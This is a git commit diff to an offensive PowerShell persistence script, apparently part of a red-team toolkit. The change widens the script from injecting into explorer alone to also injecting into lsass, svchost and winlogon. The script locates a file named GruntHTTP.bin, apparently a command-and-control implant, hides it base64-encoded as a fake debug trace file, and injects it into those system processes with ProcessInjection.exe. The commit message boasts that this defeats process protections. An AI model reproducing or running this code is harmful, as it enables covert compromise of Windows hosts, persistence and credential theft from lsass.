30ad8c8d1c237f37c85e9b6d6c65ddf3cf3b4d09
megatop1 <43348736+megatop1@users.noreply.github.com>
2022-01-19 23:01:10 -0500

    Cyber Nuke! (Ensures PPL fail)

--- Windows/Persistence/InjectPayloadtoMemoryOnboot.ps1
+++ Windows/Persistence/InjectPayloadtoMemoryOnboot.ps1
@@ -1,5 +1,10 @@
 # Get PID of first occurence of explorer.exe
-(get-process explorer).id | Select-Object -First 1 -OutVariable procid
+(get-process explorer).id | Select-Object -First 1 -OutVariable explorerid
+(get-process lsass).id | Select-Object -First 1 -OutVariable lsassid
+(get-process svchost).id | Select-Object -First 1 -OutVariable svchostid
+(get-process winlogon).id | Select-Object -First 1 -OutVariable winlogonid
+(get-process spoolsv).id | Select-Object -First 1 -OutVariable spoolsid
+
 
 # Find the absolute path to processinjection.exe and store in variable
 $file = 'ProcessInjection.exe'
@@ -11,4 +16,7 @@ $filename = Get-ChildItem -path C:\ -Filter GruntHTTP.bin -Recurse | %{$_.FullNa
 [Convert]::ToBase64String([IO.File]::ReadAllBytes($filename)) | Out-File C:\Windows\debug\wiatrace.txt
 
 # Inject Payload into Memory
-& $processInjection /pid:$pid /path:C:\Windows\debug\wiatrace.txt /f:base64 /t:1
+& $processInjection /pid:$explorerid /path:C:\Windows\debug\wiatrace.txt /f:base64 /t:1
+& $processInjection /pid:$lsassid /path:C:\Windows\debug\wiatrace.txt /f:base64 /t:1
+& $processInjection /pid:$svchostid /path:C:\Windows\debug\wiatrace.txt /f:base64 /t:1
+& $processInjection /pid:$winlogonid /path:C:\Windows\debug\wiatrace.txt /f:base64 /t:1
